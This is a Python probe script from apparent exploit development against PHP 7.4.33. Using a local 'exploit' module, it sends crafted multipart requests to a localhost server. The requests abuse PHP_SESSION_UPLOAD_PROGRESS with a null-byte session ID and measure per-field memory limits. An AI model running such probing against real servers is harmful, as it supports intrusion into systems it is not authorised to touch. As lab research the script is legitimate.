"""Test the per-field limit on 7.4.33 with memory_limit=2M.
If the per-field limit scales with memory_limit, it should be ~1M now.
"""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E
from collections import Counter

URL = "http://127.0.0.1:18108/"
t = E.Target(URL, timeout=180.0, verbose=False)

def test_field_size(mb, label):
    """Test if a field of the given size is stored (no OOM) or dropped (OOM)."""
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
    ]
    parts.append({"name": "big", "data": b"B" * int(mb * 1024 * 1024)})
    print(f"  {label}: {mb}MB field", end=" ", flush=True)

    try:
        r1 = t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=180)
        # Check if the field was stored (response should be non-empty)
        if len(r1) > 0:
            print(f"stored ({len(r1)}B response)", flush=True)
        else:
            print(f"DROPPED (empty response)", flush=True)
    except Exception as e:
        print(f"ERROR: {e}", flush=True)
    time.sleep(0.5)

print("=== Per-field limit test on 7.4.33 (memory_limit=2M) ===", flush=True)
test_field_size(0.5, "0.5MB")
test_field_size(1, "1MB")
test_field_size(1.5, "1.5MB")
test_field_size(2, "2MB")
test_field_size(3, "3MB")
test_field_size(5, "5MB")

print("\n=== done ===", flush=True)
